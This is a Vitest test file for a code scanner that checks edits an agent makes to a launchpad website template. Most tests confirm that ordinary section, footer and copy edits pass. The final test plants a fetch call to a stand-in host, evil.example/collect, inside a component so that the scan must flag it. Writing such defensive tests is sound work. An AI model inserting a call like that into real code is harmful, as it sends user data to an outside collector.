import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';

import { added, modified, rulesOf, scan } from './test-helpers.js';

/**
 * The visual library of the launchpad template (`src/components/library/`, `src/components/sections/`):
 * the agent builds the home page from it, so the ways the builder prompt describes must pass the
 * scan: importing sections and effects, swapping the footer, and copying a section to change it.
 */

const TEMPLATE = fileURLToPath(new URL('../../../launchpad-template/', import.meta.url));

function sourceFiles(dir: string): string[] {
  const out: string[] = [];
  for (const name of readdirSync(dir)) {
    const path = join(dir, name);
    if (statSync(path).isDirectory()) out.push(...sourceFiles(path));
    else if (/\.tsx?$/.test(name)) out.push(path);
  }
  return out;
}

function templateFile(path: string): string {
  return readFileSync(join(TEMPLATE, path), 'utf8');
}

describe('visual library', () => {
  it('allows a home page assembled from sections and effects', () => {
    const home = `import Explore from '@/components/Explore';
import Page from '@/components/ui/Page/Page';
import { HeroSplitCoin } from '@/components/sections/hero/HeroSplitCoin';
import { ValuesTilt } from '@/components/sections/values/ValuesTilt';
import { StepsStack } from '@/components/sections/steps/StepsStack';
import { CoinRainBanner } from '@/components/sections/coin/CoinRainBanner';
import { FaqCards } from '@/components/sections/faq/FaqCards';
import { ClosingMarquee } from '@/components/sections/closing/ClosingMarquee';
import { DotGrid } from '@/components/library/backgrounds/DotGrid';
import { ScrollWords } from '@/components/library/text/ScrollWords';

export default function Index() {
  return (
    <Page>
      <HeroSplitCoin monogram="P" primaryAction="Launch a paw" />
      <ValuesTilt title="Why Moonpaw" />
      <div className="relative">
        <DotGrid followPointer />
        <Explore />
      </div>
      <ScrollWords text="Every coin starts on the same curve." />
      <StepsStack />
      <CoinRainBanner symbol="PAW" />
      <FaqCards />
      <ClosingMarquee />
    </Page>
  );
}
`;
    const result = scan([
      modified('src/pages/index.tsx', templateFile('src/pages/index.tsx'), home),
    ]);
    expect(rulesOf(result)).toEqual([]);
  });

  it('allows a footer variant in place of the site footer', () => {
    const footer = `import { FooterWordmark } from '@/components/sections/footer/FooterWordmark';

/** Site footer: the giant wordmark variant. */
export function SiteFooter() {
  return <FooterWordmark />;
}

export default SiteFooter;
`;
    const result = scan([
      modified(
        'src/components/SiteFooter.tsx',
        templateFile('src/components/SiteFooter.tsx'),
        footer,
      ),
    ]);
    expect(rulesOf(result)).toEqual([]);
  });

  it('allows every section copied into the home folder and edited', () => {
    const dir = join(TEMPLATE, 'src/components/sections');
    // `shared.tsx` and the registry are imported by the copies, never copied: shared holds the
    // links checked at runtime (`SafeLink`), whose targets the scan cannot follow.
    const files = sourceFiles(dir).filter(
      (file) => !file.endsWith('registry.ts') && !file.endsWith('shared.tsx'),
    );
    expect(files.length).toBeGreaterThan(25);
    const changed = files.map((file) => {
      const name = relative(dir, file).replace(/\\/g, '/');
      const source = readFileSync(file, 'utf8')
        .replaceAll("from '../shared'", "from '@/components/sections/shared'")
        .replace(/from '\.\/([A-Za-z]+)'/g, (_, mod: string) => {
          const folder = name.split('/')[0];
          return `from '@/components/sections/${folder}/${mod}'`;
        });
      return added(`src/components/home/copied/${name}`, source);
    });
    const result = scan(changed);
    expect(
      result.ok ? [] : result.violations.map((v) => `${v.file}: ${v.rule} ${v.reason}`),
    ).toEqual([]);
  });

  it('still refuses what the scan refuses anywhere, inside a section', () => {
    const source = `import { HeroHalo } from '@/components/sections/hero/HeroHalo';

export function Hero() {
  fetch('https://evil.example/collect');
  return <HeroHalo />;
}
`;
    expect(rulesOf(scan([added('src/components/home/Hero.tsx', source)]))).not.toEqual([]);
  });
});
